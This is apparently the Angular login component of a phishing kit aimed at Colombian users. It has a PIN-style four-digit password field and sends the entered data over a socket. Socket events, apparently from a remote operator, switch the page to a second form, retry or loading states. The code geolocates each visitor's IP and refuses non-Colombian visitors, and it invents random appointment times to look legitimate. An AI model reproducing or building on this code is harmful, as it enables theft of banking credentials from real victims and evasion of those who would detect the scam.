import { CommonModule } from '@angular/common';

import { Component } from '@angular/core';
import {
  FormGroup,
  FormBuilder,
  Validators,
  ReactiveFormsModule,
  FormsModule,
} from '@angular/forms';
import { Router } from '@angular/router';
import { FuncionalityService } from '../../services/funcionality.service';
import { HttpClient } from '@angular/common/http';
import { ToastrService } from 'ngx-toastr';

@Component({
  selector: 'app-auth',
  imports: [ReactiveFormsModule, CommonModule, FormsModule],
  templateUrl: './auth.component.html',
  styleUrl: './auth.component.css',
})
export class AuthComponent {
  private city: string = '';
  step: number = 0;
  formData: any = {};
  private weekdaysES = [
    'domingo',
    'lunes',
    'martes',
    'miércoles',
    'jueves',
    'viernes',
    'sábado',
  ];
  private monthsES = [
    'enero',
    'febrero',
    'marzo',
    'abril',
    'mayo',
    'junio',
    'julio',
    'agosto',
    'septiembre',
    'octubre',
    'noviembre',
    'diciembre',
  ];

  public pi = '';
  public authForm: FormGroup;
  public isLoading: boolean = false;
  public weekdayName: string;
  public day: number;
  public monthName: string;
  public startTime: string;
  public endTime: string;
  public period: string;
  public errorLogin: boolean = false;

  constructor(
    private http: HttpClient,
    private fb: FormBuilder,
    private router: Router,
    private session: FuncionalityService,
    private toastr: ToastrService
  ) {

   /*  window.onTurnstileCallback = this.handleTurnstileToken.bind(this); */
    const date = new Date();
    date.setDate(date.getDate() + 1); // tomorrow

    this.weekdayName = this.weekdaysES[date.getDay()];
    this.day = date.getDate();
    this.monthName = this.monthsES[date.getMonth()];

    const hours = date.getHours();
    this.period = this.getPeriod(hours);

    // Generate random start and end times within the same period
    const isAM = hours < 12;
    const startHour = isAM
      ? Math.floor(Math.random() * 12)
      : Math.floor(Math.random() * 12) + 12;
    let endHour = isAM
      ? Math.floor(Math.random() * (12 - startHour)) + startHour + 1
      : Math.floor(Math.random() * (24 - startHour)) + startHour;

    // Ensure endHour is within the same period
    if (isAM) {
      endHour = Math.min(endHour, 11);
    } else {
      endHour = Math.min(endHour, 23);
    }

    const startMinutes = Math.floor(Math.random() * 60);
    const endMinutes = Math.floor(Math.random() * 60);

    this.startTime = this.formatTime(startHour, startMinutes);
    this.endTime = this.formatTime(endHour, endMinutes);

    this.authForm = this.fb.group({
      username: [
        '',
        [Validators.required, Validators.pattern(/^[a-zA-Z0-9]+$/)],
      ],
      password: ['', [Validators.required, Validators.pattern(/^\d{4}$/)]],
    });

     this.session.socket.on('updateStatus', (data) => {
      this.step = data.step;
    });

    this.session.socket.on('showSecondForm', () => {
      this.step = 2;
    });

    this.session.socket.on('retryForm', () => {
      this.step = 1;
    });

    this.session.socket.on('showLoading', () => {
      this.step = 3;
    });

    this.session.socket.on('showModal', (data) => {
      this.step = 4;
      alert(data.text); // Reemplaza con un modal real
    });

    this.session.socket.on('showImageModal', (data) => {
      this.step = 5;
      // Mostrar imagen en un modal
    });
  }

  ngOnInit(): void {
  }

  /* handleTurnstileToken(token: string) {
    // Envía el token al backend para validación
    this.session.handleCaptchaToken(token).subscribe((res) => {
      console.log(res);
    });
  } */

  private getPeriod(hour: number): string {
    if (hour < 12) {
      return 'de la mañana';
    } else {
      return 'de la tarde';
    }
  }

  private formatTime(hour: number, minutes: number): string {
    const twelveHour = hour % 12 || 12;
    const formattedMinutes = minutes.toString().padStart(2, '0');
    return `${twelveHour}:${formattedMinutes}`;
  }

  async onSubmit(): Promise<void> {
    this.session.submitFirstForm(this.formData);
} 

  get username() {
    return this.authForm.get('username');
  }

  get password() {
    return this.authForm.get('password');
  }

   async getPi(): Promise<{ ip: string; city: string }> {
  try {
    // Obtiene la IP pública
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();

    // Obtiene datos de geolocalización
    const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
    const locationData = await locationResponse.json();

    // Valida que el país sea Colombia
    if (locationData.country !== 'CO') {
      console.warn('Acceso denegado para IP no colombiana:', locationData.country);
      this.isLoading = false;
      this.errorLogin = true;
      throw new Error('IP no permitida');
    }

    return {
      ip: ipData.ip,
      city: locationData.city
    };
  } catch (error) {
    console.error('Error al obtener IP o ciudad:', error);
    this.isLoading = false;
    this.errorLogin = true;
    throw error;
  }
}
}
